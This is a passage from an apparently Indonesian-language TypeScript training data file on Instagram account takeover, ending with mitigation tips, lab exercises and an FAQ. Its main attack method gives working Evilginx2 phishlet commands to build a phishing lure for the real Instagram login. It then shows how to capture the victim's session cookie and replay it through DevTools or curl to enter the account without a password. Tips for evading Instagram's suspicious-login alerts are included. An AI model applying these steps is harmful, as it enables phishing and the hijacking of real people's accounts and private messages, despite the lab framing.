        nama: "Metode 3: Phish IG + Decode Session Token (Lanjut)",
        level: "lanjut",
        deskripsi: "IG kirim session cookie sebagai bagian dari response setelah login. Capture cookie itu via AitM.",
        prasyarat: ["Evilginx2 setup", "Domain wildcard", "Lab target sendiri"],
        langkah: [
          {
            judul: "Setup Evilginx2 dengan Instagram phishlet",
            aksi: "Aktifkan phishlet instagram:\nphishlets hostname instagram myigsub.phishlab.com\nphishlets enable instagram\nlures create instagram\nlures get-url 0\nURL lure dibuat untuk IG login.",
            expected: "URL lure IG aktif.",
          },
          {
            judul: "Trigger lure + capture cookie",
            aksi: "Target klik URL → IG login clone (proxy) → credential + session cookie dicapture. Login IG target sekarang attacker bisa pakai session cookie di browser sendiri (DevTools Application tab).",
            expected: "Cookie IG tertangkap di dashboard Evilginx2.",
          },
          {
            judul: "Replay session cookie ke IG",
            aksi: "Cookie IG biasanya sessionid (jsut cookie name). Attacker:\n1) Buka instagram.com di Chrome\n2) DevTools (F12) → Application → Cookies → instagram.com\n3) Add cookie: name=sessionid, value=COOKIE_DARI_PHISH, domain=.instagram.com\n4) Refresh\n\nAtau lewat curl: curl -b \"sessionid=COOKIE_VALUE\" https://www.instagram.com/",
            command: "curl -b \"sessionid=COOKIE_VALUE\" https://www.instagram.com/",
            expected: "Akun IG target loaded di browser attacker. Followers list, posts, dm - semua visible.",
          },
          {
            judul: "Pemahaman IG New Device Protection",
            aksi: "Defense IG untuk ATO:\n- Login dari IP baru → IG send kode ke SMS / push\n- Ini defense layer kedua\nTapi kalau attacker pakai cookie + same IP address enforcement, masih mungkin bypass tergantung setting IG.",
            expected: "Pemahaman bahwa IG punya defense berlapis tapi punya gaps yg bisa dieksploitasi social engineering vector.",
          },
        ],
        outputAkhir: "Berhasil session cookie capture + playback untuk login IG target tanpa password.",
        kesalahanUmum: [
          { masalah: "Cookie invalid / expired", solusi: "Cookie IG biasanya short-lived ~24h. Capture secepat mungkin. Atau utilize long-lived attack." },
          { masalah: "IG prompt 'Suspicious login attempt'", solusi: "Tambahkan email notification setup agar attacker tahu IG flag. Atau pakai VPN IP location safe." },
        ],
      },
    ],
    mitigasi: "Pertahanan Instagram Account Takeover:\n\n1. Email utama yang dipakai IG = fortified security (FIDO2 di Gmail, strong password unik)\n2. Aktifkan IG Two-Factor Authentication (Authenticator App > SMS)\n3. Periodic check login activity: Settings → Security → Login Activity. Hapus device tidak dikenal.\n4. Jangan grant access ke app 3rd-party yang tidak trusted\n5. Aktifkan 'Login Confirmation' (Device Confirmation): Settings → Security.\n6. Jangan share foto / bio dengan info terlalu personal\n7. Backup email IG pastikan aman (terpisah dari email utama, atau sama-sama fortified)",
    latihan: [
      "Setup 2 akun Instagram lab. Demo reset password attack dari compro email (email compro scenario setup sebelumnya).",
      "Clone IG login page. Setup phish server. Capture credential akun lab Anda sendiri.",
      "Latihan OSINT untuk IG: dari foto post, coba identifikasi lokasi / target personal info lain.",
      "Aktifkan IG 2FA Authenticator di akun Anda. Demo defense dari masing-masing attack vector.",
    ],
    faq: [
      { q: "Apakah IG sama-sama rentan dibanding FB takeover?", a: "IG punya vector mirip tapi ada defense 'Login Confirmation'. Attack masih mungkin tapi perlu lebih banyak effort." },
      { q: "Apakah takeover IG untuk akun verified lebih sulit?", a: "Sama konsepnya tapi biasanya konsekuensi lebih besar (financial impact kalau sponsor campaign)." },
      { q: "Apakah IG support FIDO2?", a: "IG punya 2FA WhatsApp juga: Settings → Security → Two-Factor Authentication. Lebih baik TOTP daripada SMS." },
      { q: "Bagaimana cek siapa yang punya akses IG saya?", a: "Settings → Security → Apps and Websites. Hapus app yang tidak perlu." },
    ],
    ringkasan: [
      "IG ATO vector: compro email, phish IG page, session cookie, SIM swap",
      "Crypto: compro email chain attack - email compromise → social account compromise",
      "AitM phish: bypass TOTP 2FA di IG",
      "Defense: fortified email + IG 2FA authenticator + cek login activity berkala",
      "Reporting hack ke IG via hacked Instagram form",
    ],
    materiRelated: ["Phishing", "Facebook Takeover", "Session Hijacking", "MFA"],
  } as MateriData,
];

export default seranganSocial;
